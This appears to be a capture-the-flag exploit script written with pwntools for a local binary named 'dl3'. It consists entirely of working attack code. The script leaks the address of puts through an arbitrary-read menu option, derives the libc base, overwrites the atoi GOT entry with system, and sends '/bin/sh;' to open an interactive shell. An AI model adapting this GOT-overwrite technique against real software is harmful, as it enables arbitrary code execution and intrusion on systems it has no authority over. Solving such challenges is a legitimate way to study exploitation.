#coding:utf-8
from pwn import *

context.arch = 'amd64'

elf = ELF("./dl3")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

# io = gdb.debug('./dl3', 'b *0x40091f') # break at `call atoi`
io = process(['./dl3'])

def read8(p, addr):
    io.sendlineafter("choice:", '1')
    io.sendlineafter("addr : ", str(addr))
    return u64(io.recv(8))

def write8(p, addr, val):
    io.sendlineafter("choice:", '2')
    io.sendlineafter("addr : ", str(addr))
    io.sendlineafter("value : ", str(val))

main        = 0x0000000000400753
PrdiR       = 0x400ad3
plt_puts  = elf.plt['puts']
got_puts  = elf.got['puts']


puts_addr = read8(io, got_puts)
libc.address = puts_addr - libc.symbols['puts']

print("libc base : " + hex(libc.address))

binsh_addr      = next(libc.search('/bin/sh\0'))
system_addr     = libc.symbols['system']

write8(io, elf.got['atoi'], system_addr)

io.sendlineafter("choice:", '/bin/sh;')


io.interactive()
